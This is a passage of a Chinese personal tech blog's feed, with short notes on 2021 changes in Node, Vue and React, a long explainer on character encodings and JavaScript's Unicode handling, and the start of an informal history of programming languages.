yarn。</li><li>团队内需要统一，如果不一致可能会出现依赖问题(npm 和 yarn 的 lock 文件不同)。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021 Node 的新变化</title>
      <link href="/Blog/2022/02/02/node_js/2021-Node%20%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/"/>
      <url>/Blog/2022/02/02/node_js/2021-Node%20%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/</url>
      
        <content type="html"><![CDATA[<ul><li>npm &#x3D;&gt; yarn &#x3D;&gt; pnpm，pnpm 优化了依赖，而且自带多仓库，monorepo</li><li>Next.js Nest.js Nuxt.js(vue2) Remix.js<br><img src="/Blog/2022/02/02/node_js/2021-Node%20%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/img.png" alt="img.png"></li></ul><h2 id="构建工具"><a href="#构建工具" class="headerlink" title="构建工具"></a>构建工具</h2><ul><li>Vite，抄袭借鉴了 snowpack</li></ul><p><img src="/Blog/2022/02/02/node_js/2021-Node%20%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/img_1.png"></p><ul><li>esbuild(golang 写的)、swc(rust 写的) 挑战 babel</li><li>理论上 rust 可能更快，实际上 esbuild 老 coder 写的，swc 是个小年轻，即使语言上有优势，但老司机写的代码就是好(快)一点</li></ul><p><img src="/Blog/2022/02/02/node_js/2021-Node%20%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/img_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021 Vue 的新变化</title>
      <link href="/Blog/2022/02/01/vue/2021Vue%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/"/>
      <url>/Blog/2022/02/01/vue/2021Vue%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/</url>
      
        <content type="html"><![CDATA[<ul><li>全面支持 TypeScript（vscode 有个新插件，Vetur &#x3D;&gt; Volar）</li><li>升级到 Vue 3.2 setup script</li><li><a href="https://github.com/vueuse/vueuse">VueUse</a> ，抄袭了 ReactUse，获得了 7.4k 星星</li><li>Vitejs 获得了 35.5k 星星</li></ul>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021 React 的新变化</title>
      <link href="/Blog/2022/02/01/react/2021React%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/"/>
      <url>/Blog/2022/02/01/react/2021React%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96/index/</url>
      
        <content type="html"><![CDATA[<ul><li>React 17：没有任何新功能（既然没有变化，为什么还要发版？因为做了很多的优化，重写了一些东西）</li><li>优化了事件委托（把原来的事件都绑定在 document 上，改成了绑定在根元素上，这样如果你在一个页面上有两个 React 应用也会互不干扰）</li><li>优化了 JSX（在配置的时候可以选择，新版本把 JSX 和 React 解耦了）</li><li>新概念：React Server Components（实验阶段）</li><li><a href="https://github.com/streamich/react-use">ReactUse</a> 获得了广泛的关注，27k 星星</li></ul>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>字符编码笔记</title>
      <link href="/Blog/2022/01/29/essay/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/index/"/>
      <url>/Blog/2022/01/29/essay/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/index/</url>
      
        <content type="html"><![CDATA[<h2 id="ASCII-码"><a href="#ASCII-码" class="headerlink" title="ASCII 码"></a>ASCII 码</h2><p>我们知道，计算机内部，所有信息最终都是一个二进制值。每一个二进制位（bit）有<code>0</code>和<code>1</code>两种状态，因此八个二进制位就可以组合出<code>256</code>种状态，这被称为一个字节（byte）。也就是说，一个字节一共可以用来表示<code>256</code>种不同的状态，每一个状态对应一个符号，就是<code>256</code>个符号，从<code>00000000</code>到<code>11111111</code>。</p><p>上个世纪<code>60</code>年代，美国制定了一套字符编码，对英语字符与二进制位之间的关系，做了统一规定。这被称为 <code>ASCII</code> 码，一直沿用至今。</p><p><code>ASCII</code> 码一共规定了<code>128</code>个字符的编码，比如空格<code>SPACE</code>是<code>32</code>（二进制<code>00100000</code>），大写的字母<code>A</code>是<code>65</code>（二进制<code>01000001</code>）。这<code>128</code>个符号（包括<code>32</code>个不能打印出来的控制符号），只占用了一个字节的后面<code>7</code>位，最前面的一位统一规定为<code>0</code>。</p><blockquote><p>为什么<code>1</code>个字节是<code>8</code>位，不是<code>7</code>位，不是<code>9</code>位？<br>最开始美国为了省空间就设计<code>8</code>位（8个0和1）来储存字符（ASCII），人家发明的早而已</p></blockquote><h2 id="非-ASCII-编码"><a href="#非-ASCII-编码" class="headerlink" title="非 ASCII 编码"></a>非 ASCII 编码</h2><p>英语用<code>128</code>个符号编码就够了，但是用来表示其他语言，<code>128</code>个符号是不够的。比如，在法语中，字母上方有注音符号，它就无法用 <code>ASCII</code> 码表示。于是，一些欧洲国家就决定，利用字节中闲置的最高位编入新的符号。比如，法语中的 <code>é</code> 的编码为<code>130</code>（二进制<code>10000010</code>）。这样一来，这些欧洲国家使用的编码体系，可以表示最多<code>256</code>个符号。</p><p>但是，这里又出现了新的问题。不同的国家有不同的字母，因此，哪怕它们都使用<code>256</code>个符号的编码方式，代表的字母却不一样。比如，<code>130</code>在法语编码中代表了 <code>é</code>，在希伯来语编码中却代表了字母 <code>Gimel (ג)</code>，在俄语编码中又会代表另一个符号。但是不管怎样，所有这些编码方式中，<code>0--127</code>表示的符号是一样的，不一样的只是<code>128--255</code>的这一段。</p><h3 id="IOS-8859-编码"><a href="#IOS-8859-编码" class="headerlink" title="IOS-8859 编码"></a>IOS-8859 编码</h3><p>随着计算机的普及，计算机传到了欧洲，这时候发现欧洲的常用字符也需要进行编码，于是国际标准化组织（ISO）及国际电工委员会（IEC）决定联合制定另一套字符集标准。于是 <code>ISO-8859-1</code> 字符集就诞生了。</p><p>因为 <code>ASCII</code> 只用到了 <code>0-127</code> 个位置，另外 <code>128-255</code> 的位置并没有被占用（也就是一个字节的最高位并没有被使用），于是欧洲人就把第 <code>8</code> 位利用了起来，从此 这 <code>128-255</code> 就被西欧常用字符占用了，<code>ISO-8859-1</code> 字符也叫做 <code>Latin1</code> 编码。</p><p>慢慢的，随着时间的推移，欧洲越来越多国家的字符需要编码，所以就衍生了一系列的字符集，从 <code>ISO-8859-1</code> 到 <code>ISO-8859-16</code> 经过了一系列的微调，但是这些都属于 <code>ISO-8859</code> 标准。</p><p>需要注意的是，<code>ISO-8859</code> 标准是向下兼容 <code>ASCII</code> 字符集的，所以平常我们见到的许多场景下默认都是用的 <code>ISO-8859-1</code> 编码比较多，而不会直接使用 <code>ASCII</code> 编码。</p><h3 id="GB2312-和-GBK-等双字节编码"><a href="#GB2312-和-GBK-等双字节编码" class="headerlink" title="GB2312 和 GBK 等双字节编码"></a>GB2312 和 GBK 等双字节编码</h3><p>慢慢的，随着时间的推移，计算机传到了亚洲，传到了中国以及其他国家，这时候许多国家都针对自己国家的常用文字制定了自己国家的编码。</p><p>亚洲国家的文字，使用的符号就更多了，汉字就多达<code>10万</code>左右。一个字节只能表示<code>256</code>种符号，肯定是不够的，就必须使用多个字节表达一个符号。比如，简体中文常见的编码方式是 <code>GB2312</code>，使用两个字节表示一个汉字，所以理论上最多可以表示 <code>256 x 256 = 65536</code> 个符号。</p><p>但是两个字节来存储又有一个问题，那就是比如我读取了两个字节出来，这两个字节到底是表示两个单字节字符还是表示的是双字节的中文呢？</p><p>于是我们伟大的中国人民就决定制定一套中文编码，用来兼容 <code>ASCII</code>，因为 <code>ASCII</code> 编码中的单字节字符一定是小于 <code>128</code> 的，所以最后我们就决定，中文的双字节字符都从 <code>128</code> 之后开始，也就是当发现字符连续两位都大于 <code>128</code> 时，就说明这是一个中文，指定了之后我们就把这种编码方式称之为 <code>GB2312</code> 编码。</p><blockquote><p>需要注意的是 <code>GB2312</code> 并不兼容 <code>ISO-8859-n</code> 编码集，但是兼容 <code>ASCII</code> 编码。</p></blockquote><p><code>GB2312</code> 编码收录了常用的汉字 <code>6763</code> 个和非汉字图形字符 <code>682</code> （包括拉丁字母、希腊字母、日文平假名及片假名字母、俄语西里尔字母在内的全角字符）个。</p><p>随着计算机的更进一步普及，<code>GB2312</code> 也暴露出了问题，那就是 <code>GB2312</code> 中收录的中文汉字都是简体字和常用字，对于一些生僻字以及繁体字没有收录，于是乎 <code>GBK</code> 出现了。</p><p><code>GB2312</code> 编码因为两个字节采用的都是高位，就算全部对应上，最大也只能存储 <code>16384</code> 个汉字，而我国汉字如果加上繁体字和生僻字是远远不够的，于是 <code>GBK</code> 的做法就是只要求第一位是大于 <code>128</code>，第二位可以小于 <code>128</code>，这就是说只要发现一个字节大于 <code>128</code>，那么紧随其后的一个字节就是和其作为一个整体作为中文字符，这样最多就能存储 <code>32640</code> 个汉字了。当然，<code>GBK</code> 并没有全部用完，<code>GBK</code> 共收入 <code>21886</code> 个汉字和图形符号，其中汉字（包括部首和构件）<code>21003</code> 个，图形符号 <code>883</code> 个。</p><p>后面随着计算机的再进一步普及，我们也慢慢扩展了其他的中文字符集，比如 <code>GB18030</code> 等，但是这些都属于双字节字符。</p><h2 id="Unicode字符"><a href="#Unicode字符" class="headerlink" title="Unicode字符"></a>Unicode字符</h2><p>正如上一节所说，世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。</p><p>Unicode源于一个很简单的想法：将全世界所有的字符包含在一个集合里，计算机只要支持这一个字符集，就能显示所有的字符，再也不会有乱码了。</p><p>从一出生开始，<code>Unicode</code> 就觉得除了自己，其他各位都是渣渣。所以它压根就没准备兼容其他编码，直接另起炉灶来了一套标准。<code>Unicode</code> 字符最开始采用的是 <code>UCS-2</code> 标准，<code>UCS-2</code> 标准规定一个字符至少使用 <code>2</code> 个字节来表示。当然，<code>2</code> 个字节即使全被利用也只能存储 <code>65536</code> 个字符，这肯定容纳不了世界上所有的语言和符号以及控制字符，所以后面又有了 <code>UCS-4</code> 标准，可以用 <code>4</code> 个字节来存储一个字符，四个字节来存储全世界所有语言文字和控制字符是基本没有问题了。</p><p>具体的符号对应表，可以查询<a href="https://www.unicode.org/">unicode.org</a>，或者专门的<a href="http://www.chi2ko.com/tool/CJK.htm">汉字对应表</a></p><blockquote><p>需要注意的是：Unicode 编码只是定义了字符集，对于字符集具体应该如何存储并没有做要求。站在我们开发的角度，相当于 Unicode 只定义了接口，但是没有具体的实现。</p></blockquote><blockquote><p>这里就有两个严重的问题，第一个问题是，如何才能区别 Unicode 和 ASCII ？计算机怎么知道三个字节表示一个符号，而不是分别表示三个符号呢？第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果 Unicode 统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必然有二到三个字节是0，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。</p></blockquote><blockquote><p>它们造成的结果是：1）出现了 Unicode 的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示 Unicode。2）Unicode 在很长一段时间内无法推广，直到互联网的出现。</p></blockquote><h3 id="UTF-编码家族"><a href="#UTF-编码家族" class="headerlink" title="UTF 编码家族"></a>UTF 编码家族</h3><p><code>UTF</code> 系列编码就是对 <code>Unicode</code> 字符集的实现，只不过实现的方式有所区别，其中主要有：<code>UTF-8</code>，<code>UTF-16</code>，<code>UTF-32</code> 等类型。</p><h5 id="UTF-32-编码"><a href="#UTF-32-编码" class="headerlink" title="UTF-32 编码"></a>UTF-32 编码</h5><p><code>UTF-32</code> 编码基本按照 <code>Unicode</code> 字符集标准来实现，任何一个符号都占用 <code>4</code> 个字节。可以想象，这会浪费多大空间，对英文而言，空间扩大了四倍，中文也扩大了两倍，所以这种编码方式也导致了 <code>Unicode</code> 在最初并没有被大家广泛的接受。</p><h5 id="UTF-16-编码"><a href="#UTF-16-编码" class="headerlink" title="UTF-16 编码"></a>UTF-16 编码</h5><p>前身是一个已经过时的 <code>UCS-2</code> 标准（这个标准无法编码所有的 <code>Unicode</code> 字符）；两者的关系简单说，就是UTF-16取代了UCS-2，或者说UCS-2整合进了UTF-16。所以，现在只有UTF-16，没有UCS-2。</p><p><code>UTF-16</code> 编码相比较 <code>UTF-32</code> 做了一点改进，其采用 <code>2</code> 个字节或者 <code>4</code> 个字节来存储。大部分情况下 <code>UTF-16</code> 编码都是采用 <code>2</code> 个字节来存储，而当 <code>2</code> 个字节存储时，<code>UTF-16</code> 编码会将 <code>Unicode</code> 字符直接转成二进制进行存储，对于另外一些生僻字或者使用较少的符号，<code>UTF-16</code> 编码会采用 <code>4</code> 个字节来存储，但是采用四个字节存储时需要做一次编码转换。</p><p>下表就是 <code>UTF-16</code> 编码的存储格式：</p><table><thead><tr><th>Unicode 编码范围（16 进制）</th><th>UTF-16 编码的二进制存储格式</th></tr></thead><tbody><tr><td>0x0000 0000 - 0x0000 FFFF</td><td>xxxxxxxx xxxxxxxx</td></tr><tr><td>0x0001 0000 - 0x0010 FFFF</td><td>110110xx xxxxxxxx 110111xx xxxxxxxx</td></tr></tbody></table><blockquote><p>需要注意的是：在 <code>UTF-16</code> 编码中，<code>2</code> 个字节也可能出现 <code>4</code> 字节中 <code>110110xx</code> 或者 <code>110111xx</code> 开头的格式，这两部分对应的区间分别是：<code>D800~DBFF</code> 和 <code>DC00~DFFF</code>，所以为了避免这种歧义的发生，这两部分区间是是专门空出来的，没有进行编码。</p></blockquote><h5 id="UTF-8-编码"><a href="#UTF-8-编码" class="headerlink" title="UTF-8 编码"></a>UTF-8 编码</h5><p><code>UTF-8</code> 是一种变长的编码，兼容了 <code>ASCII</code> 编码，为了实现变长这个特性，那么就必须要有一个规范来规定存储格式，这样当程序读了 <code>2</code> 个或者多个字节时能解析出这到底是表示多个单字节字符还是一个多字节字符。</p><p><code>UTF-8</code> 编码的存储规范如下表所示：</p><table><thead><tr><th>Unicode 编码范围（16 进制）</th><th>UTF-8 编码的二进制存储格式</th></tr></thead><tbody><tr><td>0x0000 0000 - 0x0000 007F</td><td>0xxxxxxx</td></tr><tr><td>0x0000 0080 - 0x0000 07FF</td><td>110xxxxx 10xxxxxx</td></tr><tr><td>0x0000 0800 - 0x0000 FFFF</td><td>1110xxxx 10xxxxxx 10xxxxxx</td></tr><tr><td>0x0001 0000 - 0x0010 FFFF</td><td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td></tr></tbody></table><h4 id="UTF-8-16-32-有啥区别？"><a href="#UTF-8-16-32-有啥区别？" class="headerlink" title="UTF-8, 16, 32 有啥区别？"></a>UTF-8, 16, 32 有啥区别？</h4><p>不同的编码格式最大的区别在于它们的 code unit（编码单位）不同。</p><ul><li>UTF-8，编码单位 &#x3D; 8-bit</li><li>UTF-16，编码单位 &#x3D; 16-bit</li><li>UTF-32，编码单位 &#x3D; 32-bit</li><li>1 UTF-32 &#x3D; 2 UTF-16 &#x3D; 4 UTF-8。</li></ul><p>UTF-8 可以用 1-4 个编码单位来做映射，而 UTF-16 只能用 1-2 个编码单位来完成，UTF-32 必须要用 1 个编码单位，所以从空间使用的效率来讲， UTF-8 最好~</p><p><img src="/Blog/2022/01/29/essay/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/index/img.png"></p><ul><li>最大码位和最小码位都一样（所以才能方便转换）；</li><li>码元（code unit）不同；</li><li>字节顺序（Byte Order）有点区别（这个概念等下讲）；</li><li>每个字符的最小编码字节数各有不同，最大编码字节数全部是 4 Byte。</li></ul><blockquote><p>Byte Order 是什么？(<a href="https://www.jianshu.com/p/86332cb5d648">大端模式和小端模式</a>)</p><ul><li>超过 1 Byte 的数据类型可以用两种方式储存在电脑里，MSB(most significant byte) 在最前面，或者 MSB 在最后。</li><li>在数据交换的时候，为了告诉接收信息的那方，当前信息的储存方式到底是 MSB 在前还是 MSB 在后，我们需要用一个 BOM 作为标识，这个字符的唯一作用就是告诉接收信息的那一方，在处理信息之前需要知道数据的顺序。</li><li>UTF-8 不涉及这个概念，因为 UTF-8 是基于字节的，它没有这个问题（只有超过 1 Byte 的才需要），所以 UTF-8 不需要 BOM，它的字符顺序永远是一致的，没有 LE,BE 这种变体。</li><li>但是 UTF-8 不需要 BOM 不代表它不可以有 BOM，如果你想的话，我们也可以给 UTF-8 加个专门用来告诉别人，我是 UTF-8 的 BOM（这个 BOM 跟 MSB 无关）<br>比如下面这张图里面，我们可以看到，BE 的标识是 FE FF，而 LE 的标识是 FF FE，UTF-8 的标识方式是 EF。<br><img src="/Blog/2022/01/29/essay/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/index/img_1.png"></li></ul></blockquote><h2 id="JavaScript使用哪一种编码？"><a href="#JavaScript使用哪一种编码？" class="headerlink" title="JavaScript使用哪一种编码？"></a>JavaScript使用哪一种编码？</h2><p>JavaScript语言采用Unicode字符集，但是只支持一种编码方法。</p><p>这种编码既不是UTF-16，也不是UTF-8，更不是UTF-32。上面那些编码方法，JavaScript都不用。</p><p><strong>JavaScript用的是UCS-2！</strong></p><blockquote><p>答案很简单：非不想也，是不能也。因为在JavaScript语言出现的时候，还没有UTF-16编码。</p></blockquote><p><strong>问题：</strong>由于JavaScript只能处理UCS-2编码，造成所有字符在这门语言中都是2个字节，如果是4个字节的字符，会当作两个双字节的字符处理。JavaScript的字符函数都受到这一点的影响，无法返回正确结果。</p><p><img src="/Blog/2022/01/29/essay/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/index/img_2.png"></p><p>这个字符它的UTF-16编码是4个字节的0xD834 DF06。问题就来了，4个字节的编码不属于UCS-2，JavaScript不认识，只会把它看作单独的两个字符U+D834和U+DF06。</p><p><strong>解决：</strong>ECMAScript 6</p><p>JavaScript的版本ECMAScript 6（简称ES6），大幅增强了Unicode支持，基本上解决了这个问题。</p><p>ES6可以自动识别4字节的码点。因此，遍历字符串就简单多了。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> s of <span class="built_in">string</span> ) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，为了保持兼容，length属性还是原来的行为方式。为了得到字符串的正确长度，可以用下面的方式。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array.<span class="keyword">from</span>(<span class="built_in">string</span>).<span class="built_in">length</span></span><br></pre></td></tr></table></figure><p>JavaScript允许直接用码点表示Unicode字符，写法是”反斜杠+u+码点”。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;好&#x27;</span> === <span class="string">&#x27;\u597D&#x27;</span> <span class="regexp">//</span> true</span><br></pre></td></tr></table></figure><p>但是，这种表示法对4字节的码点无效。ES6修正了这个问题，只要将码点放在大括号内，就能正确识别。</p><p><img src="/Blog/2022/01/29/essay/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/index/img_3.png"></p><p><strong>Unicode正规化</strong></p><p>有些字符除了字母以外，还有<a href="https://zh.wikipedia.org/wiki/%E9%99%84%E5%8A%A0%E7%AC%A6%E5%8F%B7">附加符号</a>。比如，汉语拼音的Ǒ，字母上面的声调就是附加符号。对于许多欧洲语言来说，声调符号是非常重要的。</p><p>Unicode提供了两种表示方法。一种是带附加符号的单个字符，即一个码点表示一个字符，比如Ǒ的码点是U+01D1；另一种是将附加符号单独作为一个码点，与主体字符复合显示，即两个码点表示一个字符，比如Ǒ可以写成O（U+004F） + ˇ（U+030C）。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 方法一</span><br><span class="line"><span class="string">&#x27;\u01D1&#x27;</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&#x27;Ǒ&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 方法二</span><br><span class="line"><span class="string">&#x27;\u004F\u030C&#x27;</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&#x27;Ǒ&#x27;</span></span><br></pre></td></tr></table></figure><p>这两种表示方法，视觉和语义都完全一样，理应作为等同情况处理。但是，JavaScript无法辨别。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;\u01D1&#x27;</span>===<span class="string">&#x27;\u004F\u030C&#x27;</span> </span><br><span class="line"><span class="regexp">//</span>false</span><br></pre></td></tr></table></figure><p>ES6提供了normalize方法，允许<a href="https://zh.wikipedia.org/wiki/Unicode%E6%AD%A3%E8%A6%8F%E5%8C%96">“Unicode正规化”</a>，即将两种方法转为同样的序列。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;\u01D1&#x27;</span>.<span class="keyword">normalize</span>() === <span class="string">&#x27;\u004F\u030C&#x27;</span>.<span class="keyword">normalize</span>() </span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>-完-</p><ul><li><a href="https://cn.wikichali.com/584007-character-encoding-HGBCMU">wiki:字符编码</a></li><li><a href="http://www.joelonsoftware.com/articles/Unicode.html">The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets</a>（关于字符集的最基本知识）</li><li><a href="https://www.pconline.com.cn/pcedu/empolder/gj/other/0505/616631.html">谈谈Unicode编码</a></li><li><a href="https://www.ietf.org/rfc/rfc3629.txt">RFC3629：UTF-8, a transformation format of ISO 10646</a>（如果实现UTF-8的规定）</li><li><a href="https://lunawen.com/basics/20201129-luna-tech-unicode-plane/">Unicode - 平面（Plane）的概念</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编程语言历史</title>
      <link href="/Blog/2022/01/29/essay/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%8E%86%E5%8F%B2/index/"/>
      <url>/Blog/2022/01/29/essay/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%8E%86%E5%8F%B2/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2022/01/29/essay/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%8E%86%E5%8F%B2/index/img.png"></p><ul><li><a href="https://zh.wikipedia.org/wiki/%E5%93%88%E6%96%AF%E5%87%AF%E5%B0%94%C2%B7%E6%9F%AF%E9%87%8C">Haskell curry</a>。光看这个人的名字就很厉害，Haskell 被用来作为一门编程语言的名字，Curry 被用来作为一个编程技巧。在 1930+ 的时候发明了组合逻辑。但是大部分人都没接触过，而是在别人告诉你科里化的时候才去知道这个组合逻辑。</li><li><a href="https://zh.wikipedia.org/zh-hans/%E5%9B%BE%E7%81%B5%E6%9C%BA">图灵机</a>，1937年。基本思想是用机器来模拟人们用纸笔进行数学运算的过程，像下图一样，一个纸袋在移动，可以写或擦除某个符号。简单来说就是一个能计算所有机器能计算东西的机器。目前计算机能做的时候图灵机都能做，只不过速度比较慢。</li></ul><p><img src="/Blog/2022/01/29/essay/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%8E%86%E5%8F%B2/index/img_1.png"></p><ul><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E9%9A%86%E4%BD%90%C2%B7%E9%82%B1%E5%A5%87">邱奇</a>，1936年。简单来说就是他用 lambda 演算来推演所有编程都等价于 lambda，和图灵机很相似（所有的计算机都是和图灵机等价的），而图灵是邱奇的徒弟（学生），也就是说你知道图灵机是什么就知道 lambda 演算是什么，知道 lambda 演算是什么就知道图灵机是什么。</li></ul><blockquote><p>上面三个一般人都没学会，大学不教，培训机构也不教，而大学一般从现代计算机开始教。</p></blockquote><ul><li>冯·诺依曼，现代计算机，1945年。二战的时候美国因需求找上特斯拉，但特斯拉迟迟没有做出东西，于是美方又找到冯·诺依曼接手，但是他也搞不出来这个机器。但他规定了一个电脑必须要有内存、cpu…，一个电脑必须要有哪几部分，也做出来了。但是他的情商高他说他的所有灵感都来自图灵，所以图灵就被捧上去了。</li><li>汇编 ASM，1947，布思（女）。这东西也几乎没人会了，但是三十年河东，三十年河西，现在前端又开始搞这个了（webAssembly）。汇编是做什么的？就是直接告诉（指令） cpu 要干什么事情。就像 一个软件不能在 mac 和 window 上同时运行，因为 cpu 不一样，指令集不一样。但是这种东西写起来很麻烦，虽然能用，所以能不能发明一种高级一点的语言呢，就是封装呗，能在不同的 cpu 上都能运行，你只需要表达自己的意思就好了，不用管底层是怎么执行的。所以语言有了低级、高级之分，如果一门语言离硬件很远，那么就是高级语言。第一门高级语言是什么呢？Fortran。</li><li>Fortran，1957年，由 IBM（1911年） 一个公司发明的语言，世界上第一门指令式编程，这个代码依然是给 cpu 下发指令。但是这个语言用的人也不多，因为这家公司是卖硬件的，买它的机器，然后手册上告诉你需要使用 Fortran 来操作，如果你不会，就专门派人上门来操作，那个时候软件是在作为硬件的附赠品给人的。IBM (国际 商业 机器)公司很厉害，唯一一家活了超过100年的IT公司。不想Alibaba （1999年）鸡贼，说102年，能存活三个世纪。</li></ul><blockquote><p>从这个时候开始，编程开始分为两派，编程语言一定要特别依赖某一个机器吗？<br>图灵它是以“机”为落脚点，这个理论非常依赖于机器，没有机器就没有他。<br>而 lambda 算法实际上是一种数学，并不依赖于机器，波及一些几何原理。<br>就像剑宗和气宗。剑宗主要是练剑，没有剑功法就发展不下去。而对于气宗而言，没有什么剑不剑的，那个树枝照样打。而编程的气宗是什么呢？就是 Lisp。</p></blockquote><ul><li><strong>Lisp</strong>，1958年，不同于 Fortran，从 lambda 演算发展而来，世界上第一门函数式编程语言（虽然那个时候并没有这个概念）。</li></ul><blockquote><p>面向对象是什么时候呢？</p></blockquote><ul><li>面向对象，1966年，Alan Kay，一个概念，并不是指定某个语言是面向对象，Lisp 也可以有，只要满足他的思想就是面向对象：1.所有东西都是一个一个对象，用对象来代替数据；2.对象和对象之间能发送消息。题外：源代码电影</li><li>Algol 60，1960+，最牛逼的编程语言，是程序设计语言发展史上的一个里程碑，它标志着程序设计语言成为一门独立的科学学科，并为后来软件自动化及软件可靠性的发展奠定了基础。</li></ul><blockquote><p>接下来就是开始一些大家都耳熟能详的语言了</p></blockquote><ul><li>Pascal，1970年，一般从小开始编程的人会有接触，因为他经常用于竞赛。作为一个小型的和高效的语言，意图鼓励使用结构化编程和数据结构进行良好的编程实践。</li><li><strong>smallTalk</strong>，1972年，面向对象的首个代表，因为一开始的语言不是指令式就是 Lisp 的函数式，没有专门就是面向对象，这门语言也是非常的精巧，让人能够一眼就能够看懂，<strong>基本上从这个时候开始，正常人都开始能够看的懂</strong>。</li><li>C，1972年，和 smallTalk 同时期的语言，很多地方是借鉴 Algol 60 和 Pascal。</li><li><strong>Prolog</strong>，1972年，他的编程方式有点特殊（比如：<code>friend(X,Y):-likes(X,Y),likes(Y,X).，表示对于两个对象XY，如果X喜欢Y，且Y喜欢X，那么他们是朋友。</code>），有点像现在的 CSS 一样，为什么现在都没人用了呢，因为太慢了。那什么时候又火了呢？现在比如 Siri，预先在后台把所有的信息先输入进去，然后就能够回答你。人工智能就和他有关系。并且他也和 Lisp 有点渊源的，最初的概念都是和他相关的，和图灵和相关（因为有图灵测试）。</li><li>SQL，1974年，他和 Prolog 就是挺像的，比如说 <code>select * from users</code>，就好像和人说话一样（按照某些结构），没有任何的算法，只是表达了你的需求。而 Prolog 则是我只想知道这个命题是真是假，他就会告诉你结果，你不需要思考。所以这就是这种语言的生命力，在机器越强的时候，这种语言越容易被挖掘了，我们把这种语言就是叫做<strong>声明式编程</strong>（写什么就做什么，别搞什么指令加减乘除，能做到就去做，不能做到就算了，我继续升级，<em>我们最常用的就是 CSS 了，body {color: xxx}，你写什么他就会做到什么，一般你不会问为什么是这个颜色，只会问为什么会生效</em>，题外：中二的打架招式要念出招式名字）。</li><li>C 语言，1972年，规规矩矩的指令式编程，依赖于冯诺依曼架构，没有面向对象。</li><li>Objective-C，1984年，只有苹果公司在用，他是面向对象和 C 语言的结合（如他的名字一样），质朴的面向对象，对象和对象之前能发送消息。特点啰嗦。</li><li>C++，1985年，除此之外，如果你想在 C 语言上面加上面向对象还有 C++ 可选，什么多态、封装继承都有。</li></ul><blockquote><p>C 的这一脉生命力还是非常强大的。</p></blockquote><ul><li><p>MVC 范式，1979年，主要用于 UI 编程，于是这个思想就广泛的在桌面开发领域流行开了。前端也有，前端就是抄的桌面和后端开发的 MVC，</p></li><li><p>Scheme，1975年，Lisp 的方言。</p></li><li><p>CommonLisp，1984年，也是 Lisp 的方言。</p></li></ul><blockquote><p>为什么在编程语言这里也有方言呢？<br>当然就有，在中国就有，各地都有方言。编程语言也是语言，所有也有方言。<br>为什么会有方言这种说法，因为他们的语法特别像，这里并不像 C++ 和 